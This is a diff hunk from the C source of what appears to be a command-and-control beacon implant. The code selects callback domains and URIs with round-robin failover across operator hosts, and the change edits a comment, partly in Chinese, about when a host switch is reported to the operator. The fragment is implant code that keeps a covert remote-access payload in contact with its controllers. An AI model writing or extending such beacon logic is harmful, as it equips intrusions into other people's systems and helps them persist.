@@ -210,10 +210,13 @@ void beacon(LPVOID lpReserved) {
 
 		/* 4.10 beacon_config host 热换：覆盖层接管后每周期从这里取
 		 * host/uri（round-robin 跳 held）；未接管时走烘焙 strategy 路径 */
-		/* the move to another callback host is not reported here: a beacon
-		 * that has not checked in yet has no session to send with. The
-		 * opt-in notification goes out of hostcfg_note() once a connection
-		 * is re-established (beacon_config failover_notification). */
+		/* the move to another callback host is not reported here. The
+		 * notification is the operator's choice and goes out of
+		 * hostcfg_note() once a connection is re-established
+		 * (beacon_config failover_notification). This is the baked strategy
+		 * path, which only a payload without a host list ever reaches: the
+		 * overlay hostcfg_init() fills above serves every pick from the
+		 * first cycle on. */
 		if (!hostcfg_pick(beacon_domain, 128, url, 256)) {
 			_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 			_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
